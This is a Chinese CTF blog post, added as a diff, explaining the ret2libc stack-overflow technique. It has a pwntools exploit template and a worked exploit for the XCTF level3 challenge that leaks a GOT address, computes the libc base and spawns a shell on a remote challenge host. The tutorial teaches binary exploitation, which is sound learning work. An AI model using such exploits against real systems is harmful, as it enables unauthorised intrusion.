@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 前言针对ret2libc内一类需要计算地址的题型。 这类题型一般开启了PIE，binary内部有一些output函数或者binary内部没有system(&#39;&#x2F;bin&#x2F;sh&#39;)的地址，但给出了libc.so。 0x01 概念ret2libc 劫持binary执行system(&#39;&#x2F;bin&#x2F;sh&#39;)。 0x02 劫持过程一般有一个溢出点，要进行两次劫持。 第一次">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入理解ret2libc">
+<meta property="og:url" content="https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/index.html">
+<meta property="og:site_name" content="Rj45mp&#39;s blog">
+<meta property="og:description" content="0x00 前言针对ret2libc内一类需要计算地址的题型。 这类题型一般开启了PIE，binary内部有一些output函数或者binary内部没有system(&#39;&#x2F;bin&#x2F;sh&#39;)的地址，但给出了libc.so。 0x01 概念ret2libc 劫持binary执行system(&#39;&#x2F;bin&#x2F;sh&#39;)。 0x02 劫持过程一般有一个溢出点，要进行两次劫持。 第一次">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219011006489.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219011127917.png">
+<meta property="og:image" content="https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219010627434.png">
+<meta property="article:published_time" content="2019-12-18T12:47:11.000Z">
+<meta property="article:modified_time" content="2019-12-18T17:11:46.197Z">
+<meta property="article:author" content="Rj45mp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219011006489.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/Rj45mp.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/Rj45mp.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/Rj45mp.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>深入理解ret2libc</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2019-Rj45mp-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/stackoverflow%E4%B9%8Bret2libc-1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&text=深入理解ret2libc"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&is_video=false&description=深入理解ret2libc"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=深入理解ret2libc&body=Check out this article: https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&name=深入理解ret2libc&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&t=深入理解ret2libc"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">0x01 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%8A%AB%E6%8C%81%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">0x02 劫持过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%B8%83%E5%B1%80"><span class="toc-number">4.</span> <span class="toc-text">0x03 布局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%AF%BB%E6%89%BE"><span class="toc-number">5.</span> <span class="toc-text">0x04 寻找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%AE%A1%E7%AE%97"><span class="toc-number">6.</span> <span class="toc-text">0x05 计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%8A%AB%E6%8C%81"><span class="toc-number">7.</span> <span class="toc-text">0x06 劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E6%A8%A1%E6%9D%BF"><span class="toc-number">8.</span> <span class="toc-text">0x07 模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E4%BE%8B%E5%AD%90"><span class="toc-number">9.</span> <span class="toc-text">0x08 例子</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        深入理解ret2libc
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Rj45mp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-18T12:47:11.000Z" itemprop="datePublished">2019-12-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>针对ret2libc内一类需要计算地址的题型。</p>
+<p>这类题型一般开启了PIE，binary内部有一些output函数或者binary内部没有<code>system(&#39;/bin/sh&#39;)</code>的地址，但给出了libc.so。</p>
+<h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>ret2libc 劫持binary执行<code>system(&#39;/bin/sh&#39;)</code>。</p>
+<h2 id="0x02-劫持过程"><a href="#0x02-劫持过程" class="headerlink" title="0x02 劫持过程"></a>0x02 劫持过程</h2><p>一般有一个溢出点，要进行两次劫持。</p>
+<p>第一次劫持是为了泄露出某个函数地址，第二次劫持是为了控制binary返回到libc中执行<code>system(&#39;/bin/sh&#39;)</code>。</p>
+<p>第一次劫持需要构造两个条件：</p>
+<ul>
+<li>控制binary，为第二次劫持布局。</li>
+<li>寻找output函数和待泄露函数。</li>
+</ul>
+<h2 id="0x03-布局"><a href="#0x03-布局" class="headerlink" title="0x03 布局"></a>0x03 布局</h2><p>在第一次劫持中，如何控制binary，为第二次劫持布局？</p>
+<p>首先，为完成第一次劫持，需要在溢出偏移空间内填满垃圾数据，直到覆盖ebp位置。</p>
+<p>为泄露出某个函数地址，需要output函数，也即eip位置应该为output函数的plt地址。</p>
+<p>binary运行到此处时，会进入<strong>output函数</strong>的栈帧，在进入栈帧前，根据栈帧平衡原则，需要将“老”ebp压入栈帧，</p>
+<p>然后压入<strong>函数参数</strong>，再调用函数，也即这个“老”ebp位置应为<strong>binary在最初运行时的一个函数地址</strong>。</p>
+<p>一般是<code>main</code>函数，也可为其他的。目的是在泄露完函数地址返回时，“老”ebp会被弹出来，作为下一跳eip执行，从而使得binary再次可以被劫持。</p>
+<p>这个output函数的特征必须为可以输出地址数据的函数。</p>
+<p>函数参数位置应该为待泄露函数的got地址数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = &#x27;\x90&#x27;*offset+[output_addr]+[first_addr]+[link_addr]</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-寻找"><a href="#0x04-寻找" class="headerlink" title="0x04 寻找"></a>0x04 寻找</h2><p>如何寻找output函数和待泄露函数？</p>
+<p>对于output函数，特征是可以输入地址数据的函数，一般是<code>puts</code>和<code>write</code>。</p>
+<p>需要注意一点是，output函数的参数。</p>
+<p><code>puts</code>函数的参数，就一个。而<code>write</code>函数，其为<code>write(1,addr,4)</code>,具有3个参数，后面4是泄露的字节（32位为4，64位为8）。</p>
+<p>对于待泄露函数，一般没什么规定，只要binary中存在的就好。不过为比赛好记，建议泄露<code>__libc_start_main</code>。即<code>__libc_start_main</code>的got地址数据。</p>
+<h2 id="0x05-计算"><a href="#0x05-计算" class="headerlink" title="0x05 计算"></a>0x05 计算</h2><p>在泄露出<code>__libc_start_main</code>的got地址数据后，如何计算出libc内的<code>system</code>地址和<code>/bin/sh</code>地址？</p>
+<p>libc中每个函数地址与libc的基地址和实际binary中的真实函数地址，具有以下关系：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base = func_addr - func_libc_addr</span><br></pre></td></tr></table></figure>
+
+<p>函数真实地址<code>func_addr</code>已经泄露出来，<code>func_libc_addr</code>也可通过查询打到。</p>
+<p>ps：<code>func_libc_addr</code>的确定</p>
+<p>如给出libc.so,直接查询。如没有，可以通过<code>func_addr</code>地址的最低12位来确定libc.so的版本进而查询函数地址。</p>
+<p>由此，可以计算出<code>system(&#39;/bin/sh&#39;)</code>的实际地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base = link_addr - link_libc_addr</span><br><span class="line">system_addr = libc_base+system_libc_addr</span><br><span class="line">binsh_addr = libc_base+binsh_addr</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-劫持"><a href="#0x06-劫持" class="headerlink" title="0x06 劫持"></a>0x06 劫持</h2><p>在准备好<code>system(&#39;/bin/sh&#39;)</code>的实际地址后，第二次劫持直接劫持binary执行<code>system(&#39;/bin/sh&#39;)</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 = &#x27;\x90&#x27;*offset+[system_addr]+[0xdeadbeef]+[binsh_addr]</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-模板"><a href="#0x07-模板" class="headerlink" title="0x07 模板"></a>0x07 模板</h2><p>exp模板：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = offset_data</span><br><span class="line">p = process(&#x27;./binary&#x27;)</span><br><span class="line">elf = ELF(&#x27;./binary&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc.so.version&#x27;)</span><br><span class="line">first_addr = elf.symbols[&#x27;first&#x27;]</span><br><span class="line">output_plt_addr = elf.plt[&#x27;output&#x27;]</span><br><span class="line">link_got_addr = elf.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">payload1 = &#x27;\x90&#x27;*offset+[output_plt_addr]+[first_addr]+[link_got_addr]</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">link_addr = u32(p.recv(4))  #u64(p.recv(8))</span><br><span class="line">link_libc_addr = libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">system_libc_addr = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh_libc_addr = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">libc_base = link_addr - link_libc_addr</span><br><span class="line">system_addr = libc_base+system_libc_addr</span><br><span class="line">binsh_addr = libc_base+binsh_libc_addr</span><br><span class="line">payload2 = &#x27;\x90&#x27;*offset+[system_addr]+[0xdeadbeef]+[binsh_addr]</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-例子"><a href="#0x08-例子" class="headerlink" title="0x08 例子"></a>0x08 例子</h2><p>以XCTF-level3为例</p>
+<p><strong>checkup：</strong></p>
+<p><img src="/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219011006489.png" alt="image-20191219011006489"></p>
+<p><img src="/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219011127917.png" alt="image-20191219011127917"></p>
+<p><strong>exploit：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x88+4</span><br><span class="line">p = remote(&#x27;111.198.29.45&#x27;,36318)</span><br><span class="line">elf = ELF(&#x27;./level3&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc_32.so.6&#x27;)</span><br><span class="line">first_addr = elf.symbols[&#x27;vulnerable_function&#x27;]</span><br><span class="line">output_plt_addr = elf.plt[&#x27;write&#x27;]</span><br><span class="line">link_got_addr = elf.got[&#x27;write&#x27;]</span><br><span class="line">payload1 = flat([&#x27;\x90&#x27;*offset,output_plt_addr,first_addr,1,link_got_addr,4])</span><br><span class="line">p.sendlineafter(&quot;Input:\n&quot;,payload1)</span><br><span class="line">link_addr = u32(p.recv(4))</span><br><span class="line">link_libc_addr = libc.symbols[&#x27;write&#x27;]</span><br><span class="line">system_libc_addr = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh_libc_addr = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">libc_base = link_addr - link_libc_addr</span><br><span class="line">system_addr = libc_base+system_libc_addr</span><br><span class="line">binsh_addr = libc_base+binsh_libc_addr</span><br><span class="line">payload2 = flat([&#x27;\x90&#x27;*offset,system_addr,0xdeadbeef,binsh_addr])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/image-20191219010627434.png" alt="image-20191219010627434"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/firends/">Firends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">0x01 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%8A%AB%E6%8C%81%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">0x02 劫持过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%B8%83%E5%B1%80"><span class="toc-number">4.</span> <span class="toc-text">0x03 布局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%AF%BB%E6%89%BE"><span class="toc-number">5.</span> <span class="toc-text">0x04 寻找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%AE%A1%E7%AE%97"><span class="toc-number">6.</span> <span class="toc-text">0x05 计算</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%8A%AB%E6%8C%81"><span class="toc-number">7.</span> <span class="toc-text">0x06 劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E6%A8%A1%E6%9D%BF"><span class="toc-number">8.</span> <span class="toc-text">0x07 模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E4%BE%8B%E5%AD%90"><span class="toc-number">9.</span> <span class="toc-text">0x08 例子</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&text=深入理解ret2libc"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&is_video=false&description=深入理解ret2libc"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=深入理解ret2libc&body=Check out this article: https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&title=深入理解ret2libc"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&name=深入理解ret2libc&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rj45mp.github.io/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2libc/&t=深入理解ret2libc"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Rj45mp
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/firends/">Firends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
